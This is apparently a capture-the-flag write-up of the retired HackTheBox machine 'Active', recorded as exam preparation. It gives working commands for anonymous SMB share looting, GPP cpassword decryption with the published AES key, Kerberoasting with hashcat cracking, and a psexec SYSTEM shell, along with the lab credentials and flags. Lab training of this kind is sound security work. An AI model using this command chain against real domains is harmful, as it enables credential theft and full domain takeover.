# ACTIVE - Easy

**Date Started:** June 8, 2026
**Difficulty:** Easy
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, SMB, GPP cpassword, Kerberoasting, psexec
**Status:** ✅ COMPLETE

---

## Summary / Attack Chain

A credential-ladder box — no exploits, pure AD misconfiguration chaining:

```
anonymous SMB → Replication share (READ)
  → GPP Groups.xml → decrypt cpassword → SVC_TGS:GPPstillStandingStrong2k18
    → Kerberoast (Administrator has an SPN) → crack TGS → Administrator:Ticketmaster1968
      → psexec → NT AUTHORITY\SYSTEM → root
```

**Two key techniques:** GPP cpassword decryption + Kerberoasting (both CPTS-exam staples).

---

## Phase 1 — Enumeration

### Step 1 — Full TCP port sweep (breadth)

```bash
nmap -p- --min-rate 1000 -T4 <TARGET> -oN active_allports.txt
```
- `-p-` = all 65535 ports (AD services live high: 88, 389, 445, 5722, 9389, 47001, RPC 49000+)
- `--min-rate 1000 -T4` = speed (tune down on a real engagement for stealth)

**Findings:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001 + RPC high ports.

### Step 2 — Service/script scan (depth)

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sC -sV <TARGET> -oN active_services.txt
```

**Findings / reads:**
- Port cluster **53 + 88 + 389/636 + 3268/3269 + 445 + 464** = **Domain Controller** (3268/3269 Global Catalog is DC-only).
- **Domain: `active.htb`** (from the LDAP 389/3268 lines — LDAP is authoritative for the domain name).
- **OS: Windows Server 2008 R2 SP1** (from DNS version line) — ancient, EOL → old misconfigs likely.
- `smb2-security-mode: signing required` → **SMB relay is off the table** here.
- Host: `DC`.

Add to hosts (AD/Kerberos tooling needs name resolution):
```bash
echo "<TARGET> active.htb DC.active.htb DC" | sudo tee -a /etc/hosts
```

---

## Phase 2 — SMB Enumeration (anonymous)

First question on any AD box: *can I read anything without creds?*

```bash
nxc smb <TARGET> -u '' -p '' --shares
```
- `-u '' -p ''` = null/anonymous session (allowed here — header shows `Null Auth: True`, the root misconfig).

**Findings:**
| Share | Perms |
|---|---|
| ADMIN$, C$, IPC$, NETLOGON, SYSVOL, Users | *(no anon access)* |
| **Replication** | **READ** |

**`Replication` is the anomaly** — non-default share, anonymously readable. Rule: non-default share + anon read = investigate immediately. The name on a 2008 R2 DC = almost certainly a copy of **SYSVOL** (Group Policy data).

### Pull the share

```bash
mkdir -p ~/active/replication && cd ~/active/replication
smbclient //<TARGET>/Replication -U '%' -c 'recurse ON; prompt OFF; mget *'
find . -type f
```
- `-U '%'` = null session; `recurse/prompt/mget` = grab the whole (small) share non-interactively.

**Loot found:** `active.htb/Policies/{31B2F340-...}/MACHINE/Preferences/Groups/Groups.xml`
The `MACHINE/Preferences/Groups/` path = **Group Policy Preferences (GPP)**.

---

## Phase 3 — GPP cpassword → SVC_TGS creds

```bash
cat "./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"
```

```xml
<User ... userName="active.htb\SVC_TGS"><Properties ...
  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" .../></User>
```

**The GPP cpassword vuln:** GPP stored local-account passwords in `Groups.xml`, AES-256 encrypted. In 2012 **Microsoft published the AES key** in MSDN — so it's effectively plaintext. MS14-025 (2014) stopped *new* ones but old files linger. This is a **decrypt**, not a crack.

`gpp-decrypt` isn't on Ubuntu — do it with openssl (this IS what gpp-decrypt does internally):
```bash
echo -n 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ==' \
| base64 -d \
| openssl enc -d -aes-256-cbc \
    -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
    -iv 00000000000000000000000000000000 2>/dev/null \
| iconv -f UTF-16LE -t UTF-8; echo
```
- `-K` = Microsoft's published GPP AES-256 key (constant); `-iv` = fixed zero IV; cleartext is UTF-16LE.

**Result:** `SVC_TGS : GPPstillStandingStrong2k18`

### Validate (always, before building on a cred)
```bash
nxc smb <TARGET> -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```
→ `[+] active.htb\SVC_TGS:GPPstillStandingStrong2k18` — now an authenticated domain user.

### User flag (credentialed SMB — Users share now readable)
```bash
smbclient //<TARGET>/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
# cd SVC_TGS\Desktop ; get user.txt ; exit
cat user.txt    # 9241b75df10933aa09120aaedf12cf5d
```
*(Inside smbclient, `cat` doesn't work — it's not a shell. Use `get` then read locally, or `!cat`.)*

---

## Phase 4 — Kerberoasting → Domain Admin

**Concept:** any authenticated domain user can request a service ticket (TGS) for any account with an **SPN**; the DC encrypts it with that account's password hash → crack offline. Works because service passwords are human-set/weak and the DC doesn't check authorization.

```bash
GetUserSPNs.py -dc-ip <TARGET> active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -request -outputfile admin_tgs.hash
```

**The misconfiguration:** the only SPN account is the **built-in `Administrator`** (`active/CIFS:445`). The domain admin was run as a service account → cracking its ticket = instant Domain Admin.

> Note: `SVC_TGS` is the **shooter** (authenticated user that requests the ticket), `Administrator` is the **target** (has the SPN). `SVC_TGS` itself has no SPN and is *not* Kerberoastable.

### Crack offline (on the GPU host, not the proxy box)
```bash
scp opsbox:~/active/replication/admin_tgs.hash ~/
hashcat -m 13100 ~/admin_tgs.hash ~/wordlists/rockyou.txt
```
- `-m 13100` = Kerberos 5 TGS-REP etype 23. Cracked in **~1 second**.

**Result:** `Administrator : Ticketmaster1968`

---

## Phase 5 — Domain Admin → SYSTEM → root

### Confirm privilege
```bash
nxc smb <TARGET> -u Administrator -p 'Ticketmaster1968'
```
→ `(Pwn3d!)` = admin on the box.

### Get a SYSTEM shell
```bash
psexec.py active.htb/Administrator:'Ticketmaster1968'@<TARGET>
```
- The `*exec` family turns creds into shells: `psexec` uploads a service binary to `ADMIN$`, registers it as a service, runs it as **SYSTEM**. (`wmiexec.py` = quieter/no service, preferred on real engagements; `smbexec.py` = semi-interactive.)

```cmd
whoami                                       # nt authority\system
type C:\Users\Administrator\Desktop\root.txt # b4fdd80f3eba4d361a92d3352570ffa4
exit                                         # IMPORTANT: lets psexec remove its service + binary
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `9241b75df10933aa09120aaedf12cf5d` |
| root.txt | `b4fdd80f3eba4d361a92d3352570ffa4` |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Lessons / Exam Relevance

- **Credential ladder mindset** — AD compromise is chaining access (anon → user → admin), not single exploits. This shape repeats across nearly every AD box and the CPTS exam.
- **Enumerate exhaustively before exploiting** — the entire path was a readable share. No CVE touched.
- **GPP cpassword** — readable SYSVOL/Replication + `Groups.xml` = free creds. Decrypt with the public MS key (`-m`? no — it's decryption, not cracking).
- **Kerberoasting** — any domain user → roast any SPN account → `hashcat -m 13100`. Recognize the misconfig of a privileged account holding an SPN.
- **`*exec` family** — `psexec`/`wmiexec`/`smbexec` for creds→shell; `nxc ... (Pwn3d!)` to confirm admin first.
- **Hygiene** — `exit` psexec cleanly so it removes its service/binary.

## Cleanup / Changes Made (engagement habit)
- `psexec` service `HtwT` + `ADMIN$` binary — auto-removed on clean `exit`.
- Downloaded Replication share contents + GPP cpassword to attack host (loot).
